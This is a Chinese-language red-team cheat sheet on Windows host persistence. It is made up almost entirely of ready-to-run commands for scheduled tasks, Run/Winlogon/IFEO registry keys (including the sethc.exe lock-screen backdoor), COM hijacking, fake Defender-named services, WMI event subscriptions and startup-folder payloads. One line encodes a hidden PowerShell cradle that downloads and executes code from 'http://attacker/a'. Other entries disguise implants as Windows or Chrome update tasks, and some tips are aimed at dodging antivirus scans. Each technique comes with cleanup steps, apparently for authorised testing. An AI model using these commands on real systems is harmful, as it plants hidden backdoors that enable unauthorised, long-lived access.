# 主机级持久化技术

## 计划任务

### SharPersist

```powershell
# 编码 PowerShell payload
$str = 'IEX ((new-object net.webclient).downloadstring("http://attacker/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

# 创建计划任务 - 每小时触发
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64_PAYLOAD" -n "Updater" -m add -o hourly

# 创建计划任务 - 登录触发
SharPersist.exe -t schtask -c "C:\ProgramData\svc.exe" -n "ChromeUpdate" -m add -o logon

# 查看已创建的任务
SharPersist.exe -t schtask -m list
SharPersist.exe -t schtask -m check -n "Updater"
```

SharPersist 参数:
- `-t` 持久化类型 (schtask, reg, service, startupfolder)
- `-c` 执行命令路径
- `-a` 命令参数
- `-n` 任务名称
- `-m` 操作 (add / remove / check / list)
- `-o` 触发频率 (minute / hourly / daily / logon / onstart)

### schtasks 原生命令

```bash
# 开机启动 (SYSTEM 权限运行)
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f

# 每 30 分钟执行
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 30 /ru SYSTEM /f

# 每天凌晨 3 点执行
schtasks /create /tn "DiskCleanup" /tr "C:\Windows\Temp\svc.exe" /sc daily /st 03:00 /ru SYSTEM /f

# 系统启动时执行
schtasks /create /tn "BootLoader" /tr "C:\Windows\Temp\svc.exe" /sc onstart /ru SYSTEM /f

# 验证任务
schtasks /query /tn "WindowsDefenderUpdate" /v /fo list
```

### XML 任务定义 (高级)

```powershell
# 导出已有合法任务作为模板
schtasks /query /tn "MicrosoftEdgeUpdateTaskMachineCore" /xml > template.xml

# 修改 XML 中的 <Exec><Command> 节点指向 payload
# 导入修改后的 XML
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /xml modified.xml /f
```

### 清理

```bash
schtasks /delete /tn "WindowsDefenderUpdate" /f
schtasks /delete /tn "SystemHealthCheck" /f
SharPersist.exe -t schtask -n "Updater" -m remove
```

---

## 注册表自启动

### Run / RunOnce 键

```bash
# HKCU Run (当前用户，无需管理员)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f

# HKCU RunOnce (仅执行一次，执行后自动删除)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SetupComplete" /t REG_SZ /d "C:\ProgramData\setup.exe" /f

# HKLM Run (所有用户，需要管理员)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f

# HKLM RunOnce
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SetupComplete" /t REG_SZ /d "C:\ProgramData\setup.exe" /f
```

### Winlogon Shell / Userinit

```bash
# Winlogon Shell (替换或追加)
# 默认值: explorer.exe
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\ProgramData\payload.exe" /f

# Userinit (追加)
# 默认值: C:\Windows\system32\userinit.exe,
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\ProgramData\payload.exe" /f
```

> **注意**: Winlogon 修改影响所有用户登录，修改错误可能导致系统无法登录。务必保留原始值。

### Image File Execution Options (IFEO)

```bash
# 劫持辅助功能程序 (无需登录即可触发)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
# 锁屏界面连按 5 次 Shift 触发 cmd

# 劫持放大镜
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# 劫持屏幕键盘
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

### 清理

```bash
# Run 键
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Winlogon (恢复默认值)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f

# IFEO
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /f
```

---

## COM 劫持

### 原理

Windows 查找 COM 对象时优先搜索 HKCU，再搜索 HKLM。在 HKCU 中注册同 CLSID 的恶意 DLL，应用加载时即执行攻击者代码。

### 发现可劫持的 CLSID

```powershell
# 方法 1: 通过计划任务查找用户级 COM 引用
$Tasks = Get-ScheduledTask
foreach ($Task in $Tasks) {
  if ($Task.Actions.ClassId -ne $null) {
    if ($Task.Triggers.Enabled -eq $true) {
      if ($Task.Principal.GroupId -eq "Users") {
        Write-Host "Task: $($Task.TaskName)  CLSID: $($Task.Actions.ClassId)"
      }
    }
  }
}

# 方法 2: 使用 Process Monitor
# 1. 添加过滤器: Operation = RegOpenKey, Result = NAME NOT FOUND, Path contains InprocServer32
# 2. 观察哪些 HKCU CLSID 查找失败 (可被劫持)
```

常用劫持目标:
- `{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}` - 计划任务触发
- `{BCDE0395-E52F-467C-8E3D-C4579291692E}` - MMDeviceEnumerator (音频相关，频繁加载)
- Explorer 加载的 Shell Extension CLSID

### 执行劫持

```powershell
# 1. 确认 HKCU 中不存在该 CLSID
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
# 应报错: Cannot find path

# 2. 确认 HKLM 中存在 (否则不会被加载)
Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

# 3. 创建 HKCU 劫持项
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### 清理

```powershell
Remove-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Recurse -Force
# 同时删除落地的 DLL 文件
Remove-Item "C:\Payloads\beacon.dll" -Force
```

---

## Windows 服务

### 创建恶意服务

```bash
# sc create (自动启动)
sc create "WindowsDefSvc" binPath= "C:\Windows\legit-svc.exe" start= auto DisplayName= "Windows Defender Update Service"
sc description "WindowsDefSvc" "Provides protection against malware and unwanted software"
sc start "WindowsDefSvc"

# sc create (服务 DLL 形式)
sc create "WinDefAgent" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
reg add "HKLM\System\CurrentControlSet\Services\WinDefAgent\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Windows\legit.dll" /f
```

```powershell
# SharPersist
SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

> **注意**: 服务以 SYSTEM 身份运行，但 SYSTEM 无法进行网络 NTLM 认证。使用 SMB/TCP/DNS 通道而非 HTTP。

### 清理

```bash
sc stop "WindowsDefSvc"
sc delete "WindowsDefSvc"
# 删除二进制
del "C:\Windows\legit-svc.exe"
# 如果用了服务 DLL 形式，还需删除注册表
reg delete "HKLM\System\CurrentControlSet\Services\WinDefAgent" /f
```

---

## WMI 事件订阅

WMI 永久事件订阅由三个组件组成，必须全部创建才能生效，也必须全部删除才能彻底清理。

### 完整 PowerShell 创建

```powershell
# === 组件 1: EventFilter (触发条件) ===
$FilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
    QueryLanguage = 'WQL'
}
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

# === 组件 2: CommandLineEventConsumer (执行动作) ===
$ConsumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = 'C:\Windows\Temp\svc.exe'
}
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# === 组件 3: FilterToConsumerBinding (绑定关系) ===
$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### wmic 创建

```bash
# EventFilter
wmic /namespace:"\\root\subscription" path __EventFilter create Name="WinUpdate", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# CommandLineEventConsumer
wmic /namespace:"\\root\subscription" path CommandLineEventConsumer create Name="WinUpdateConsumer", CommandLineTemplate="C:\Windows\Temp\svc.exe"

# FilterToConsumerBinding
wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"WinUpdate\"", Consumer="CommandLineEventConsumer.Name=\"WinUpdateConsumer\""
```

### EventFilter 常用查询语法

```
# 系统启动后 N 秒 (避免杀软启动扫描)
SELECT * FROM __InstanceModificationEvent WITHIN 60
  WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
  AND TargetInstance.SystemUpTime >= 240

# 特定进程启动时
SELECT * FROM __InstanceCreationEvent WITHIN 5
  WHERE TargetInstance ISA 'Win32_Process'
  AND TargetInstance.Name = 'explorer.exe'

# 用户登录时
SELECT * FROM __InstanceCreationEvent WITHIN 15
  WHERE TargetInstance ISA 'Win32_LogonSession'
  AND TargetInstance.LogonType = 2

# 定时触发 (每 10 分钟)
SELECT * FROM __InstanceModificationEvent WITHIN 600
  WHERE TargetInstance ISA 'Win32_LocalTime'
  AND TargetInstance.Minute = 0
```

### PowerLurk 快捷方式

```powershell
Import-Module .\PowerLurk.ps1

# 进程启动触发
Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\artifact.exe" -Trigger ProcessStart -ProcessName notepad.exe

# 定时触发
Register-MaliciousWmiEvent -EventName WmiTimer -PermanentCommand "C:\Windows\artifact.exe" -Trigger Interval -IntervalPeriod 3600

# 查看事件
Get-WmiEvent -Name WmiBackdoor
```

### 清理 (必须删除全部三个组件)

```powershell
# 查看所有 WMI 订阅
Get-WmiObject -Namespace root/subscription -Class __EventFilter
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding

# 删除指定订阅
Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*WindowsUpdateFilter*'} | Remove-WmiObject

# PowerLurk 清理
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

---

## 启动文件夹

### 路径

```
当前用户:
  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
  C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

所有用户 (需管理员):
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

### 创建

```powershell
# 直接复制可执行文件
copy C:\Payloads\beacon.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"

# 创建 LNK 快捷方式 (更隐蔽)
$WshShell = New-Object -ComObject WScript.Shell
$lnk = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk")
$lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$lnk.Arguments = "-nop -w hidden -enc BASE64_PAYLOAD"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,21"
$lnk.Save()

# SharPersist
SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64_PAYLOAD" -f "UserEnvSetup" -m add
```

### 清理

```powershell
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe" -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk" -Force
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe" -Force
```
